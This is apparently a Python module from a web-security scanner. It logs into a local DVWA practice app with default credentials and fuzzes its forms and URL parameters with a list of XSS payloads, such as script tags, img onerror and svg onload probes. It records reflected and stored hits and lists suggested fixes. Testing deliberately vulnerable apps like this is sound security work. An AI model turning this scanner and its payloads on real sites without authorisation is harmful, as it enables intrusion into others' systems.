"""
xss.py — Module version for import into main.py

Contains run() function that:
- Logs in (DVWA-style)
- Extracts & tests forms for reflected/stored XSS
- Tests URL query parameters
- Saves results to xss_findings.json
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import json
import copy
import time
import html

# -------- CONFIG --------
base_host = "http://localhost:8080"
login_page = base_host + "/login.php"
target_page = base_host + "/vulnerabilities/xss_r/"  # change as needed
username = "admin"
password = "password"

DELAY_BEFORE_RECHECK = 0.5   # seconds
# ------------------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<img src=x onerror=console.log('xss')>",
    "';alert(1);//",
    "<body onload=alert(1)>"
]

# Suggested fixes for XSS
def suggested_fixes():
    return {
        "output_encoding": "Encode output contextually before rendering user data.",
        "input_validation": "Validate input; use allow-lists where possible.",
        "csp": "Implement Content Security Policy (CSP).",
        "http_only_cookies": "Set HttpOnly + Secure flags.",
        "escape_on_output": "Escape user data on output instead of sanitizing input."
    }

# ---------------- Helpers ----------------
def form_action_url(base, action):
    return urljoin(base, action) if action else base

def is_payload_reflected(payload, text):
    if text is None:
        return (False, False)
    exact = payload in text
    escaped = html.escape(payload) in text
    return (exact, escaped)

# ---------------- Testing Routines ----------------
def test_form(session, page_url, form):
    findings = []
    action = form.get("action")
    method = (form.get("method") or "get").lower()
    action_url = form_action_url(page_url, action)
    inputs = form.get("inputs", [])

    # Build baseline innocent data
    baseline_data = {inp.get("name"): "test" for inp in inputs if inp.get("name")}
    
    # Baseline response
    try:
        if method == "post":
            base_resp = session.post(action_url, data=baseline_data, timeout=8, allow_redirects=True)
        else:
            base_resp = session.get(action_url, params=baseline_data, timeout=8, allow_redirects=True)
        base_text = base_resp.text if base_resp is not None else ""
    except Exception:
        base_text = ""

    # Payload injection
    for payload in XSS_PAYLOADS:
        for target in list(baseline_data.keys()) + ["ALL_FIELDS"]:
            test_data = baseline_data.copy()

            if target == "ALL_FIELDS":
                for k in test_data.keys():
                    test_data[k] = payload
            else:
                if target in test_data:
                    test_data[target] = payload

            try:
                if method == "post":
                    resp = session.post(action_url, data=test_data, timeout=8, allow_redirects=True)
                else:
                    resp = session.get(action_url, params=test_data, timeout=8, allow_redirects=True)
                test_text = resp.text if resp is not None else ""
            except Exception:
                test_text = ""
                resp = None

            exact_reflect, escaped_reflect = is_payload_reflected(payload, test_text)
            rel_change = (abs(len(test_text or "") - len(base_text or "")) / len(base_text)
                          if base_text else (1.0 if test_text else 0))

            if exact_reflect or (not exact_reflect and rel_change > 0.25):
                findings.append({
                    "type": "reflected",
                    "action_url": action_url,
                    "method": method,
                    "injected_field": target,
                    "payload": payload,
                    "exact_reflection": exact_reflect,
                    "html_escaped_reflection": escaped_reflect,
                    "rel_length_change": rel_change,
                    "status_code": resp.status_code if resp is not None else None
                })

            # Stored XSS check
            try:
                time.sleep(DELAY_BEFORE_RECHECK)
                recheck = session.get(page_url, timeout=8, allow_redirects=True)
                recheck_text = recheck.text if recheck is not None else ""
                stored_exact, stored_escaped = is_payload_reflected(payload, recheck_text)
                if stored_exact or stored_escaped:
                    findings.append({
                        "type": "stored",
                        "page_checked": page_url,
                        "action_url": action_url,
                        "method": method,
                        "injected_field": target,
                        "payload": payload,
                        "stored_exact_reflection": stored_exact,
                        "stored_html_escaped_reflection": stored_escaped,
                        "status_code": recheck.status_code if recheck is not None else None
                    })
            except Exception:
                pass

    return findings


def test_url_params(session, url):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        return []

    findings = []
    try:
        base_resp = session.get(url, timeout=8)
        base_text = base_resp.text if base_resp is not None else ""
    except Exception:
        base_text = ""

    for param in qs.keys():
        for payload in XSS_PAYLOADS:
            test_qs = copy.deepcopy(qs)
            test_qs[param] = [payload]

            new_query = urlencode({k: v[0] for k, v in test_qs.items()})
            new_url = parsed._replace(query=new_query).geturl()

            try:
                resp = session.get(new_url, timeout=8)
                test_text = resp.text if resp is not None else ""
            except Exception:
                test_text = ""
                resp = None

            exact_reflect, escaped_reflect = is_payload_reflected(payload, test_text)
            rel_change = (abs(len(test_text or "") - len(base_text or "")) / len(base_text)
                          if base_text else (1.0 if test_text else 0))

            if exact_reflect or (not exact_reflect and rel_change > 0.25):
                findings.append({
                    "type": "reflected",
                    "tested_url": new_url,
                    "param": param,
                    "payload": payload,
                    "exact_reflection": exact_reflect,
                    "html_escaped_reflection": escaped_reflect,
                    "rel_length_change": rel_change,
                    "status_code": resp.status_code if resp is not None else None
                })

            # stored XSS recheck
            try:
                time.sleep(DELAY_BEFORE_RECHECK)
                recheck = session.get(target_page, timeout=8)
                recheck_text = recheck.text if recheck is not None else ""
                stored_exact, stored_escaped = is_payload_reflected(payload, recheck_text)
                if stored_exact or stored_escaped:
                    findings.append({
                        "type": "stored",
                        "page_checked": target_page,
                        "tested_url": new_url,
                        "param": param,
                        "payload": payload,
                        "stored_exact_reflection": stored_exact,
                        "stored_html_escaped_reflection": stored_escaped,
                        "status_code": recheck.status_code if recheck is not None else None
                    })
            except Exception:
                pass

    return findings

# ---------------- Login ----------------
def do_login(session):
    try:
        r = session.get(login_page, timeout=8)
    except Exception as e:
        print("[!] Cannot reach login page:", e)
        return False

    soup = BeautifulSoup(r.text or "", "html.parser")
    hidden = {}

    form = soup.find("form")
    if form:
        for hid in form.find_all("input", {"type": "hidden"}):
            name = hid.get("name")
            if name:
                hidden[name] = hid.get("value", "")

    payload = {
        **hidden,
        "username": username,
        "password": password,
        "Login": "Login"
    }

    try:
        r2 = session.post(login_page, data=payload, timeout=8, allow_redirects=True)
        return ("Logout" in r2.text or "DVWA" in r2.text)
    except Exception as e:
        print("[!] Login request failed:", e)
        return False


# ---------------- Main Run Function ----------------
def run():
    print("[+] Starting XSS testing module...")

    sess = requests.Session()

    if not do_login(sess):
        print("[-] Login failed. Stopping XSS tests.")
        return

    # Fetch target page & extract forms
    try:
        r = sess.get(target_page, timeout=8)
        html_text = r.text if r is not None else ""
        soup = BeautifulSoup(html_text, "html.parser")
    except Exception as e:
        print("[!] Cannot fetch target page:", e)
        return

    forms = []
    for form_tag in soup.find_all("form"):
        inputs = [{"name": i.get("name"), "type": i.get("type")}
                  for i in form_tag.find_all(['input', 'textarea', 'select'])]
        forms.append({
            "action": form_tag.get("action"),
            "method": form_tag.get("method"),
            "inputs": inputs
        })

    findings = []

    for f in forms:
        findings.extend(test_form(sess, target_page, f))

    findings.extend(test_url_params(sess, target_page))

    output = {
    "findings": [
        {
            **f,
            "test": "XSS",
            "url": target_page
        } for f in findings
    ]
}

    with open("xss_findings.json", "w", encoding="utf-8") as fh:
        json.dump(output, fh, indent=2, ensure_ascii=False)

    # output = {
    #     "tested_page": target_page,
    #     "forms_tested": len(forms),
    #     "xss_findings": findings,
    #     "suggested_fixes": suggested_fixes()
    # }

    # with open("xss_findings.json", "w", encoding="utf-8") as fh:
    #     json.dump(output, fh, indent=2, ensure_ascii=False)

    print(f"[+] XSS testing finished. Forms tested: {len(forms)}")
    print(f"[+] Findings saved to xss_findings.json")
